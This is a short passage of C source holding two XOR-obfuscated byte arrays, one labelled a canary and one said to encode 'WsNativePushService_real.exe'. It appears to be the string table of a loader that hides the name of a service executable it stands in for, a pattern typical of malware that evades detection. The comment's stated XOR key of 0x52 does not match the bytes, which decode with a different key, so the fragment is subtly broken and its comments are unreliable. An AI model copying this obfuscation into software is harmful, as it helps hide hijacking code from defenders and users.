...
static const unsigned char xCanary[] = {
    0xE7, 0xCC, 0x84, 0xF1, 0xCB, 0xC0, 0xC4, 0xC1,
    0xF1, 0xD7, 0x84, 0xF0, 0xC1, 0xCD, 0xD6, 0x84,
    0xD7, 0xF2, 0xC7, 0x8C, 0xCA, 0xC1, 0xC5, 0xC8,
    0xD0, 0xCA, 0x96, 0xC8, 0xC1, 0xC3
};
#define xCanary_LEN 30

/* "WsNativePushService_real.exe" XOR 0x52 */
static const unsigned char xRealExe[] = {
    0xF3, 0xD7, 0xEA, 0xC5, 0xD0, 0xCB, 0xF2, 0xC1,
    0xF4, 0xD1, 0xD7, 0xCA, 0xF7, 0xC1, 0xD6, 0xF2,
    0xCB, 0xC7, 0xC1, 0x8C, 0xD6, 0xC1, 0xC5, 0xC8,
    0x96, 0xC1, 0xFC, 0xC1
};
